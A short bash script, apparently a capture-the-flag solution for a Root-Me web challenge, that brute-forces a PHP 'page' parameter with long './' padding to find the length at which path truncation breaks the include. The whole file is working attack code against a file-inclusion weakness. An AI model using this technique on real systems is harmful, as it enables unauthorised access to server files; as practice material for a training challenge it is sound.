#!/bin/bash
i=0
url="http://challenge01.root-me.org/web-serveur/ch35/index.php?page="
len_url=${#url}
end=$((( ( 4096 - len_url ) / 2 ) + 1))
while [ $i -lt $end ]
do
	padding=$( printf "./%.0s" {$(seq $i)} )
	payload="$url""$padding""home"
	echo $payload

	res=$( curl $payload )
	if [[ ! "$res" =~ "Work" ]]; then #Work가 존재하지 않으면
		echo "Found index!\n"
		echo "Found index!\n"
		echo "Found index!\n"
		echo "index:"$i > results.txt
		read
	fi
	i=$(($i+1))

done
